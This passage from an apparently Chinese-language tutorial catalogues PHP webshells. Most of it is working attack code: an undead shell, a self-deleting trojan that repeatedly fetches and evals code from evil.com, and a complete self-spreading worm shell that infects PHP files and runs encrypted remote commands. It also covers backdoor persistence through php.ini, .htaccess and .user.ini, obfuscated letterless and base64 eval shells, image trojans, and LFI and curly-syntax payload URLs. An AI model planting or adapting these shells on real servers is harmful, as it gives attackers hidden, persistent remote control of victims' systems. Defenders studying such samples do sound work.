$code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;
while (1)&#123;
    file_put_contents($file,$code);
    system(&#39;touch -m -d &quot;2019-10-01 10:10:10&quot; .2.php&#39;);
    usleep(5000);
&#125; 
?&gt;</code></pre>

<h3 id="5-自删除木马"><a href="#5-自删除木马" class="headerlink" title="5. 自删除木马"></a>5. 自删除木马</h3><p>自删除木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中，无文件木马类型之一</p>
<pre class="language-none"><code class="language-none">&lt;?php
unlink($_SERVER[&#39;SCRIPT_FILENAME&#39;]);
ignore_user_abort(true);
set_time_limit(0);

$remote_file &#x3D; &#39;http:&#x2F;&#x2F;www.evil.com&#x2F;eval.txt&#39;;
while($code &#x3D; file_get_contents($remote_file))&#123;
  @eval($code);
  sleep(5);
&#125;;
?&gt;</code></pre>

<h3 id="6-蠕虫马"><a href="#6-蠕虫马" class="headerlink" title="6. 蠕虫马"></a>6. 蠕虫马</h3><p>交叉感染的木马，可以把本地的php会写shell插入到其他php原文件，通过相互复活机制，与其他已感染的主机中的webshell互相复活</p>
<p><strong>3s_NWGeek 木马</strong></p>
<pre class="language-none"><code class="language-none">&lt;?php
$tips &#x3D; &#39;AWD_Light_Check&#39;;
&#x2F;&#x2F;这个是后面检查的是否感染头，如果没有，就会重写这个php
error_reporting(0);
$Serv_Num &#x3D; 159;
&#x2F;&#x2F;这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。
$arr_dir &#x3D; array();
&#x2F;&#x2F;全局变量，扫到的文件夹
$files &#x3D; array();
&#x2F;&#x2F;全局变量，扫到的文件
if (!function_exists(&#39;Url_Check&#39;)) &#123;
    function Url_Check()
    &#123;
        $pageURL &#x3D; &#39;http&#39;;
        if ($_SERVER[&quot;HTTPS&quot;] &#x3D;&#x3D; &quot;on&quot;) &#123;
            $pageURL .&#x3D; &quot;s&quot;;
        &#125;
        $pageURL .&#x3D; &#39;:&#x2F;&#x2F;&#39;;
        $pageURL .&#x3D; $_SERVER[&quot;SERVER_NAME&quot;] . &quot;:&quot; . $_SERVER[&quot;SERVER_PORT&quot;];
        return $pageURL;
    &#125;
    function file_check($dir)
    &#123;
        &#x2F;&#x2F;扫描文件夹
        global $arr_dir;
        global $files;
        if (is_dir($dir)) &#123;
            if ($handle &#x3D; opendir($dir)) &#123;
                while (($file &#x3D; readdir($handle)) !&#x3D;&#x3D; false) &#123;
                    if ($file !&#x3D; &#39;.&#39; &amp;&amp; $file !&#x3D; &quot;..&quot;) &#123;
                        if (is_dir($dir . &quot;&#x2F;&quot; . $file)) &#123;
                            $arr_dir[] &#x3D; $dir;
                            $files[$file] &#x3D; file_check($dir . &quot;&#x2F;&quot; . $file);
                            &#x2F;&#x2F;拼接文件
                        &#125; else &#123;
                            $arr_dir[] &#x3D; $dir;
                            $files[] &#x3D; $dir . &quot;&#x2F;&quot; . $file;
                        &#125;
                    &#125;
                &#125;
            &#125;
        &#125;
        closedir($handle);
        $arr_dir &#x3D; array_unique($arr_dir);
        &#x2F;&#x2F;去重
    &#125;
    function write_conf()
    &#123;
        #每个目录创一个马
        global $Serv_Num;
        global $arr_dir;
        foreach ($arr_dir as $dir_path) &#123;
            &#x2F;&#x2F; echo &#39;&lt;br&gt;&#39;.$dir_path;
            $srcode &#x3D; &#39;&#39;;
            $localtext &#x3D; file(__FILE__);
            for ($i &#x3D; 0; $i &lt; $Serv_Num; $i++) &#123;
                $srcode .&#x3D; $localtext[$i];
            &#125;
            &#x2F;&#x2F;所有文件夹都生成一个webshell
            &#x2F;&#x2F; echo &quot;&lt;span style&#x3D;&#39;color:#666&#39;&gt;&lt;&#x2F;span&gt; &quot; . $dir_path . &quot;&#x2F;.Conf_check.php&quot; . &quot;&lt;br&#x2F;&gt;&quot;;
            $le &#x3D; Url_Check();
            echo &#39;&lt;iframe id&#x3D;&quot;check_url&quot;&gt;&#39; . $le . &#39;&#39; . str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;], &#39;&#39;, $dir_path . &quot;&#x2F;.Conf_check.php&quot;) . &#39;&lt;&#x2F;iframe&gt;&#39;;
            fputs(fopen($dir_path . &quot;&#x2F;.Conf_check.php&quot;, &quot;w&quot;), $srcode);
        &#125;
        &#x2F;&#x2F; 当前目录所有php被感染
    &#125;
    function vul_tran()
    &#123;
        &#x2F;&#x2F;每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。
        &#x2F;&#x2F;######
        global $Serv_Num;
        $pdir &#x3D; dirname(__FILE__);
        &#x2F;&#x2F;要获取的目录
        &#x2F;&#x2F;先判断指定的路径是不是一个文件夹
        if (is_dir($pdir)) &#123;
            if ($dh &#x3D; opendir($pdir)) &#123;
                while (($fi &#x3D; readdir($dh)) !&#x3D; false) &#123;
                    &#x2F;&#x2F;文件名的全路径 包含文件名
                    $file_Path &#x3D; $pdir . &#39;&#x2F;&#39; . $fi;
                    if (strpos($file_Path, &#39;.php&#39;)) &#123;
                        &#x2F;&#x2F;筛选当前目录.php后缀
                        $le &#x3D; Url_Check();
                        $file_Path &#x3D; str_replace(&#39;\&#39;, &#39;&#x2F;&#39;, $file_Path);
                        echo &#39;&lt;iframe id&#x3D;&quot;check_url&quot;&gt;&#39; . $le . &#39;&#39; . str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;], &#39;&#39;, $file_Path) . &#39;&lt;&#x2F;iframe&gt;&#39;;
                        $ftarget &#x3D; file($file_Path);
                        if (!strpos($ftarget[0], &#39;AWD_Light_Check&#39;)) &#123;
                            &#x2F;&#x2F;检查头部是否传播
                            $scode &#x3D; &#39;&#39;;
                            $localtext &#x3D; file(__FILE__);
                            for ($i &#x3D; 0; $i &lt; $Serv_Num; $i++) &#123;
                                $scode .&#x3D; $localtext[$i];
                            &#125;
                            $code_check &#x3D; &#39;&#39;;
                            $file_check &#x3D; fopen($file_Path, &quot;r&quot;);
                            &#x2F;&#x2F;复制要传播的文件代码，进行重写
                            while (!feof($file_check)) &#123;
                                $code_check .&#x3D; fgets($file_check) . &quot;n&quot;;
                            &#125;
                            fclose($file_check);
                            $webpage &#x3D; fopen($file_Path, &quot;w&quot;);
                            fwrite($webpage, $scode . $code_check);
                            fclose($webpage);
                        &#125;
                    &#125;
                &#125;
                closedir($dh);
            &#125;
        &#125;
    &#125;
&#125;
&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;
&#x2F;&#x2F;主函数
try &#123;
    &#x2F;&#x2F;定义特征才启动传播模式，特征值为_
    if (isset($_GET[&#39;_&#39;])) &#123;
        $host &#x3D; Url_Check();
        file_check($_SERVER[&#39;DOCUMENT_ROOT&#39;]);
        &#x2F;&#x2F;全局扫描
        write_conf();
        &#x2F;&#x2F;写入单文件
        vul_tran();
        &#x2F;&#x2F;感染当前目录
    &#125; elseif (isset($_GET[&#39;time&#39;]) &amp;&amp; isset($_GET[&#39;salt&#39;]) &amp;&amp; isset($_GET[&#39;sign&#39;])) &#123;
        #客户端数字签名校验
        $Check_key &#x3D; &#39;9c82746189f3d1815f1e6bfe259dac29&#39;;
        $Check_api &#x3D; $_GET[&#39;check&#39;];
        $timestamp &#x3D; $_GET[&#39;time&#39;];
        $salt &#x3D; $_GET[&#39;salt&#39;];
        $csign &#x3D; $_GET[&#39;sign&#39;];
        $sign &#x3D; md5($Check_api . $Check_key . $timestamp . $salt);
        if ($sign &#x3D;&#x3D;&#x3D; $csign) &#123;
            $nomal_test &#x3D; &#39;&#39;;
            for ($i &#x3D; 0; $i &lt; strlen($Check_api); $i++) &#123;
                $nomal_test .&#x3D; chr(ord($Check_api[$i]) ^ $i % $salt);
            &#125;
            $nomal_test &#x3D; base64_decode($nomal_test);
            $nowtime &#x3D; time();
            if (abs($nowtime - $timestamp) &lt;&#x3D; 5) &#123;
                $enc &#x3D; base64_encode(rawurlencode(&#96;&#123;$nomal_test&#125;&#96;));
                &#x2F;&#x2F;解密并执行命令在加密返回
                $pieces &#x3D; explode(&quot;i&quot;, $enc);
                $final &#x3D; &quot;&quot;;
                foreach ($pieces as $val) &#123;
                    $final .&#x3D; $val . &quot;cAFAcABAAswTA2GE2c&quot;;
                &#125;
                $final &#x3D; str_replace(&quot;&#x3D;&quot;, &quot;:kcehc_revres&quot;, $final);
                echo strrev(substr($final, 0, strlen($final) - 18));
                exit;
            &#125; else &#123;
                header(&#39;HTTP&#x2F;1.1 500 Internal Server Error&#39;);
            &#125;
        &#125; else &#123;
            header(&#39;HTTP&#x2F;1.1 500 Internal Server Error&#39;);
        &#125;
    &#125; else &#123;
        header(&#39;HTTP&#x2F;1.1 500 Internal Server Error&#39;);
    &#125;
&#125; catch (Exception $e2) &#123;
&#125;</code></pre>

<h2 id="0x03-命令执行方式"><a href="#0x03-命令执行方式" class="headerlink" title="0x03 命令执行方式"></a>0x03 命令执行方式</h2><h3 id="1-直接执行"><a href="#1-直接执行" class="headerlink" title="1. 直接执行"></a>1. 直接执行</h3><p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行</p>
<pre class="language-none"><code class="language-none">&lt;?php
@eval(&#39;echo 命令执行;&#39;);
?&gt;</code></pre>

<h3 id="2-动态函数执行"><a href="#2-动态函数执行" class="headerlink" title="2. 动态函数执行"></a>2. 动态函数执行</h3><p>先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
<pre class="language-none"><code class="language-none">&lt;?php    
$a&#x3D;&quot;phpinfo&quot;;$a();
?&gt;</code></pre>

<h3 id="3-文件包含执行"><a href="#3-文件包含执行" class="headerlink" title="3. 文件包含执行"></a>3. 文件包含执行</h3><p>有两个php文件，把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
<pre class="language-none"><code class="language-none">b.php
&lt;?php
@eval(&#39;echo 命令执行;&#39;);
?&gt;

a.php
&lt;?php
include a.php;
?&gt;</code></pre>

<h3 id="4-回调函数"><a href="#4-回调函数" class="headerlink" title="4. 回调函数"></a>4. 回调函数</h3><p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行


&lt;?php
$func &#x3D; &#39;system&#39;;
$arr &#x3D; array(&#39;id&#39;);
array_map($func, $arr);
?&gt;</code></pre>

<h3 id="5-PHP-Curly-Syntax"><a href="#5-PHP-Curly-Syntax" class="headerlink" title="5. PHP Curly Syntax"></a>5. PHP Curly Syntax</h3><p>在字符串中掺杂变量，再使用变量去拼接字符串，达到命令执行的效果</p>
<pre class="language-none"><code class="language-none">&lt;?php
$a &#x3D; &#39;p&#39;;
eval(&quot;&#123;$a&#125;hpinfo();&quot;);
?&gt;</code></pre>

<h3 id="6-php反序列化"><a href="#6-php反序列化" class="headerlink" title="6. php反序列化"></a>6. php反序列化</h3><p>根据php反序列化漏洞来实现命令执行，先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
<pre class="language-none"><code class="language-none">&lt;?php

class test&#123;
    public $a&#x3D;&quot;123&quot;;
    public function __wakeup()&#123;
        eval($this-&gt;a);
    &#125;
&#125;
unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#39;);

?&gt;</code></pre>

<h3 id="7-php-x2F-x2F-input方法"><a href="#7-php-x2F-x2F-input方法" class="headerlink" title="7. php:&#x2F;&#x2F;input方法"></a>7. php:&#x2F;&#x2F;input方法</h3><p><code>php://input</code> 可以访问请求的原始数据的只读流，可以理解为我们传post参数，<code>php://input</code> 会读取到，这时候就可以加以利用</p>
<pre class="language-none"><code class="language-none">&lt;?php
@eval(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;));
?&gt;</code></pre>

<h3 id="8-preg-replace方法"><a href="#8-preg-replace方法" class="headerlink" title="8. preg_replace方法"></a>8. preg_replace方法</h3><p><code>preg_replace</code> 函数执行一个正则表达式的搜索和替换。可以使用一个命令执行函数去替换正常的字符串，然后去执行命令</p>
<pre class="language-none"><code class="language-none">
&lt;?php
echo preg_replace(&quot;&#x2F;test&#x2F;e&quot;,phpinfo(),&quot;test&quot;);
?&gt;</code></pre>

<h3 id="9-ob-start函数"><a href="#9-ob-start函数" class="headerlink" title="9. ob_start函数"></a>9. ob_start函数</h3><p><code>ob_start</code>函数是打开输出控制缓冲，传入的参数会在使用<code>ob_end_flush</code>函数的时候去调用它执行输出在缓冲区的数据</p>
<pre class="language-none"><code class="language-none">
&lt;?php
$cmd &#x3D; &#39;system&#39;;
ob_start($cmd);
echo &quot;id&quot;;
ob_end_flush(); &#x2F;&#x2F;输出全部内容到浏览器
?&gt;</code></pre>

<h2 id="0x04-变种与隐藏"><a href="#0x04-变种与隐藏" class="headerlink" title="0x04 变种与隐藏"></a>0x04 变种与隐藏</h2><h3 id="1-php-ini隐藏后门"><a href="#1-php-ini隐藏后门" class="headerlink" title="1. php.ini隐藏后门"></a>1. php.ini隐藏后门</h3><pre class="language-none"><code class="language-none">在php.ini 中添加:

auto_prepend_file &#x3D; webshell.php
; (auto_prepend_file是在任意PHP脚本的头部)
; (auto_append_file是在任意PHP脚本的尾部)
; (不管头部还是尾部，webshell都能被正常执行)

include_path &#x3D; &quot;&#x2F;usr&#x2F;share&#x2F;www&#x2F;shell;.&quot;
;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)

在&quot;&#x2F;usr&#x2F;share&#x2F;www&#x2F;shell&quot;中创建 webshell.php: &lt;?php eval($_POST[1]); ?&gt;
这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门</code></pre>

<p>这种利用php.ini的webshell部署攻击方式，一般来说，只有黑客具有了远程修改文件或者已经拿到了目标主机的权限，为了之后的隐蔽访问，而采取的在php.ini中部署一个”后门”，这种webshell部署更倾向于隐藏后门</p>
<h3 id="2-htaccess文件PHP后门"><a href="#2-htaccess文件PHP后门" class="headerlink" title="2. .htaccess文件PHP后门"></a>2. .htaccess文件PHP后门</h3><p>.htaccess是apache的分布式配置文件，提供了针对不同WEB应用对应的子目录改变配置的方法，.htaccess中的指令可以对httpd.conf进行覆盖，前提是httpd.conf中开启了允许覆盖的开关</p>
<pre class="language-none"><code class="language-none">AllowOverride All</code></pre>

<p><strong>.htaccess指令</strong></p>
<pre class="language-none"><code class="language-none">1. AddHandler
    1) Description: Maps the filename extensions to the specified handler
    2) Syntax: AddHandler handler-name extension [extension] ...
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Base
    6) Module: mod_mime

refer: http:&#x2F;&#x2F;httpd.apache.org&#x2F;docs&#x2F;2.2&#x2F;mod&#x2F;mod_mime.html#addhandler
example: AddHandler php5-script .logs  &#x2F;&#x2F;对.logs的后缀文件解析映射到PHP脚本解析器上

2. AddType
    1) Description:    Maps the given filename extensions onto the specified content type
    2) Syntax: AddType MIME-type extension [extension] ...
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Base
    6) Module: mod_mime

refer: http:&#x2F;&#x2F;httpd.apache.org&#x2F;docs&#x2F;2.2&#x2F;mod&#x2F;mod_mime.html#addhandler
example: AddType text&#x2F;html .logs  &#x2F;&#x2F;指定了.logs的后缀的文件的文件扩展类型为&quot;text&#x2F;html&quot;，决定了PHP解析这个文件的方式

3. SetHandler
    1) Description:    Forces all matching files to be processed by a handler
    2) Syntax: SetHandler handler-name|None
    3) Context: server config, virtual host, directory, .htaccess
    4) Override: FileInfo
    5) Status: Core
    6) Module: core
    7) Compatibility: Moved into the core in Apache 2.0

refer: http:&#x2F;&#x2F;httpd.apache.org&#x2F;docs&#x2F;2.2&#x2F;mod&#x2F;core.html#sethandler
example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请求都强制指定为使用&quot;application&#x2F;x-httpd-php&quot;进行解析</code></pre>

<p><strong>隐藏方式</strong></p>
<pre class="language-none"><code class="language-none">1）SetHandler
  a. 可将php代码存于非php后缀文件，例: x.png
  b. 将以下代码写入.htaccess中
     SetHandler application&#x2F;x-httpd-php
  c. 连接x.png即可启动后门木马

2）AddHandler、AddType
  a. 可将php代码存于非php后缀文件，例: x.log
  b. 将以下代码写入.htaccess中
     AddHandler php5-script .log
     AddType text&#x2F;html .log
  c. 连接x.log，此时x.log会被apache当成PHP脚本进行解析

3) php_value
  将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马
  php_value auto_append_file &#x2F;usr&#x2F;share&#x2F;www&#x2F;webshell.php</code></pre>

<h3 id="3-user-ini文件构成的PHP后门"><a href="#3-user-ini文件构成的PHP后门" class="headerlink" title="3. .user.ini文件构成的PHP后门"></a>3. .user.ini文件构成的PHP后门</h3><p>.user.ini是php应用的分布式配置文件，与.htaccess的利用思想类似，.user.ini也利用分布式的自定义配置文件、从而进行”配置覆盖、劫持”</p>
<pre class="language-none"><code class="language-none">1. 自PHP 5.3.0起，PHP支持基于每个目录的&quot;.htaccess风格&quot;的&quot;INI文件&quot;。此类文件仅被CGI&#x2F;FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果 

2. 除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到web根目录($_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的)。如果被执行的PHP文件在web根目录之外，则只扫描该目录。

3. 在.user.ini风格的INI文件中只有具有
    1) PHP_INI_PERDIR
    2) PHP_INI_USER
模式的INI设置可被识别 

4. 两个新的INI指令
    1) user_ini.filename
    2) user_ini.cache_ttl
控制着用户INI文件的使用 

5. user_ini.filename设定了PHP会在每个目录下搜寻的文件名
    1) 如果设定为空字符串则PHP不会搜寻
    2) 默认值是: .user.ini 

6. user_ini.cache_ttl控制着重新读取用户INI文件的间隔时间
    默认是300秒</code></pre>

<p>在.user.ini风格的INI文件中只有具有”PHP_INI_PERDIR”和”PHP_INI_USER”模式的INI设置可被识别，由此可以知道，”.user.ini”实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为”PHP_INI_PERDIR、PHP_INI_USER”的设置</p>
<p>与php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间(默认为300秒)，即可被重新加载</p>
<h3 id="4-利用PHP动态变量特性"><a href="#4-利用PHP动态变量特性" class="headerlink" title="4. 利用PHP动态变量特性"></a>4. 利用PHP动态变量特性</h3><pre class="language-none"><code class="language-none">&lt;?php
    &#x2F;&#x2F;@eval($_POST[&#39;op&#39;]);
    @eval($&#123;&quot;_P&quot;.&quot;OST&quot;&#125;[&#39;op&#39;]);
?&gt;

&#x2F;&#x2F;使用注释符来规避基于黑名单的正则
&lt;?php
    &#x2F;&#x2F;@eval($_POST[&#39;op&#39;]);
    @eval($&#x2F;*aaa*&#x2F;&#123;&quot;_P&quot;.&quot;OST&quot;&#125;[&#39;op&#39;]);
?&gt;

&#x2F;&#x2F; 使用$_REQUEST、$GLOBALS[&quot;_POST&quot;]、$_FILES等来获取数据，$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件
&lt;?php
    @eval($_REQUEST[&#39;op&#39;]);
?&gt;

&lt;?php
    @eval($GLOBALS[&#39;_POST&#39;][&#39;op&#39;]);
?&gt;

&lt;?php
    @eval($_FILES[&#39;name&#39;]);
?&gt;
(再把payload写在文件名中)</code></pre>

<h3 id="5-tiny-php-shell"><a href="#5-tiny-php-shell" class="headerlink" title="5. tiny php shell"></a>5. tiny php shell</h3><pre class="language-none"><code class="language-none">需目标服务器php.ini开启如下配置：
short_open_tag &#x3D; On

&lt;?&#x3D;($_&#x3D;@$_GET[2]).@$_($_GET[1])?&gt;

http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;webshell.php?2&#x3D;system&amp;1&#x3D;dir </code></pre>

<h3 id="6-无字母-webshell"><a href="#6-无字母-webshell" class="headerlink" title="6. 无字母 webshell"></a>6. 无字母 webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
$_&#x3D;&quot;&quot;;
$_[+$_]++;
$_&#x3D;$_.&quot;&quot;;
$___&#x3D;$_[+&quot;&quot;];&#x2F;&#x2F;A
$____&#x3D;$___;
$____++;&#x2F;&#x2F;B
$_____&#x3D;$____;
$_____++;&#x2F;&#x2F;C
$______&#x3D;$_____;
$______++;&#x2F;&#x2F;D
$_______&#x3D;$______;
$_______++;&#x2F;&#x2F;E
$________&#x3D;$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;&#x2F;&#x2F;O
$_________&#x3D;$________;
$_________++;$_________++;$_________++;$_________++;&#x2F;&#x2F;S
$_&#x3D;$____.$___.$_________.$_______.&#39;6&#39;.&#39;4&#39;.&#39;_&#39;.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;&#x2F;&#x2F;R
$_____&#x3D;$_________;
$_____++;&#x2F;&#x2F;T
$__&#x3D;$___.$_________.$_________.$_______.$________.$_____;
$__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));   
&#x2F;&#x2F;ASSERT(BASE64_DECODE(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));
&#x2F;&#x2F;ASSERT(&quot;eval($_POST[1])&quot;);
&#x2F;&#x2F;key:&#x3D;1
?&gt;</code></pre>

<h3 id="7-图片木马"><a href="#7-图片木马" class="headerlink" title="7. 图片木马"></a>7. 图片木马</h3><pre class="language-none"><code class="language-none">webshell.php:
&lt;?php
    $wp__theme_icon&#x3D;create_function(&#39;&#39;,file_get_contents(&#39;&#x2F;hack.gif&#39;));
    $wp__theme_icon();
?&gt;
hack.gif:
phpinfo();

这是图片木马的利用方式的一种，但是这种方不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码
string create_function ( string $args , string $code )

而create_function(&#39;&#39;,file_get_contents(&#39;&#x2F;hack.gif&#39;)); 这种方法不允许图片中有非法数据(真实的图片数据)，否则就会出现解析错误，所以攻击者只能把纯的木马脚本保存成图片格式，这样就可能导致无法绕过图片上传防御机制 </code></pre>

<p><strong>注意</strong></p>
<pre class="language-none"><code class="language-none">1. short_open_tag &#x3D; On
由于jpg、gif等格式的图片中，出现&lt;?字符的频率很高，很容易造成PHP解析错误

2. short_open_tag &#x3D; Off
这种情况下，图片WEBSHELL的运行较稳定，攻击者插入的&lt;?php ?&gt;能够得到稳定的执行</code></pre>

<h3 id="8-字符串拼接-PHP动态函数执行"><a href="#8-字符串拼接-PHP动态函数执行" class="headerlink" title="8. 字符串拼接+PHP动态函数执行"></a>8. 字符串拼接+PHP动态函数执行</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 用于动态执行的字符串必须是&quot;assert&quot;，不能是&quot;eval&quot;，因为在PHP中，eval不是函数，而assert是函数

&lt;?php
    $char_as&#x3D;&#39;as&#39;;
    $char_e&#x3D;&#39;e&#39;;
    $char_assert&#x3D;$char_as.&#39;s&#39;.$char_e.&#39;r&#39;.&#39;t&#39;;
    $char_base64_decode&#x3D;&#39;b&#39;.$char_as.$char_e.(64).&#39;_&#39;.&#39;d&#39;.$char_e.&#39;c&#39;.&#39;o&#39;.&#39;d&#39;.$char_e;
    @$char_assert(@$char_base64_decode(&#39;ZXZhbCgkX1BPU1RbMTIzXSkK&#39;));
    &#x2F;&#x2F;ZXZhbCgkX1BPU1RbMTIzXSkK: &quot;eval($_POST[123])&quot;
?&gt;</code></pre>

<h3 id="9-Curly-Syntax"><a href="#9-Curly-Syntax" class="headerlink" title="9. Curly Syntax"></a>9. Curly Syntax</h3><pre class="language-none"><code class="language-none">&lt;?php 
    $k &#x3D; &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;
?&gt;

&lt;?php 
   $xsser &#x3D; $_GET[&quot;op&quot;]; 
   @eval(&quot;\$safedg &#x3D; $xsser;&quot;) 
?&gt;

http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?op&#x3D;$&#123;$&#123;fputs(fopen(&quot;webshell.php&quot;, &quot;w+&quot;), &quot;&lt;?php eval(\$_POST[1]);?&gt;webshell&quot;)&#125;&#125;;

&#x2F;&#x2F; 当应用系统的输入点存在注入点，并且这个输入能够到达代码的某个变量赋值的代码流位置，攻击者可以利用这次&quot;变量赋值&quot;进行一次&quot;代码执行&quot;</code></pre>

<p>curl语法代码执行是不能带回显，不能作为一个webshell指令执行跳板来使用，而只能作为”一次性代码执行且不需要回显”的场景，即向本地磁盘写一个新的webshell文件</p>
<h3 id="10-LFI导致的代码执行"><a href="#10-LFI导致的代码执行" class="headerlink" title="10. LFI导致的代码执行"></a>10. LFI导致的代码执行</h3><pre class="language-none"><code class="language-none">&lt;?php
    $to_include &#x3D; $_GET[&#39;file&#39;];
    require_once($to_include);
?&gt;

或者
eval(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); 

&#x2F;&#x2F; 这种LFI可能导致攻击者将文件包含漏洞升级为代码执行漏洞
http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</code></pre>

<h3 id="11-PHP动态创建匿名函数-Lamda表达式"><a href="#11-PHP动态创建匿名函数-Lamda表达式" class="headerlink" title="11. PHP动态创建匿名函数(Lamda表达式)"></a>11. PHP动态创建匿名函数(Lamda表达式)</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 利用动态变量直接动态执行函数，PHP允许使用create_function动态的进行&quot;匿名函数(Lamda)&quot;的创建、

string create_function ( string $args , string $code )
&lt;?php
    $foobar &#x3D; $_GET[&#39;foobar&#39;];
    $dyn_func &#x3D; create_function(&#39;$foobar&#39;, &quot;echo $foobar;&quot;);
    $dyn_func(&#39;&#39;);
?&gt;

http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?foobar&#x3D;system(&#39;dir&#39;)
http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?foobar&#x3D;eval(&#39;phpinfo();&#39;)
http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?foobar&#x3D;eval(&quot;$_POST[1]&quot;) 

动态函数的另一种写法：
&lt;?php
    eval(&quot;function lambda_n() &#123; echo system(&#39;dir&#39;); &#125;&quot;);
    lambda_n();
?&gt;

&lt;?php
    eval(&quot;function lambda_n() &#123; eval($_GET[1]); &#125;&quot;);
    lambda_n();
?&gt;

http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?1&#x3D;phpinfo()

&lt;?php    
    eval(&#39;function lambda_n() &#123; eval($_POST[1]); &#125;&#39;);    
    lambda_n();
?&gt;

&#x2F;&#x2F; 在PHP内部 create_function() 只是对 eval()的一层封装，最终还是使用eval()进行代码执行</code></pre>

<p>create_function另一种形式</p>
<pre class="language-none"><code class="language-none">gif89a
&lt;?php
    $_chr &#x3D; chr(99).chr(104).chr(114); &#x2F;&#x2F;chr  
    $_eval_post_1 &#x3D; $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); &#x2F;&#x2F;eval($_POST[1]); 
    $_create_function &#x3D; $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); &#x2F;&#x2F;create_function 

    $_&#x3D; $_create_function(&quot;&quot;,$_eval_post_1); &#x2F;&#x2F;die(var_dump($_create_function ));
    @$_();
?&gt;</code></pre>

<h3 id="12-利用系统输出缓存"><a href="#12-利用系统输出缓存" class="headerlink" title="12. 利用系统输出缓存"></a>12. 利用系统输出缓存</h3><pre class="language-none"><code class="language-none">&lt;?php
    $foobar &#x3D; &#39;system&#39;;
    ob_start($foobar);
    echo &quot;dir c:&quot;;
    ob_end_flush();
?&gt;

&#x2F;&#x2F; ob_start()会把接收到的字符串当作一个&quot;回调函数callback_func&quot;，并将接下来的缓冲区输入，当作这个&quot;回调函数&quot;的参数

还可以重写ob_start方法

&lt;?php 
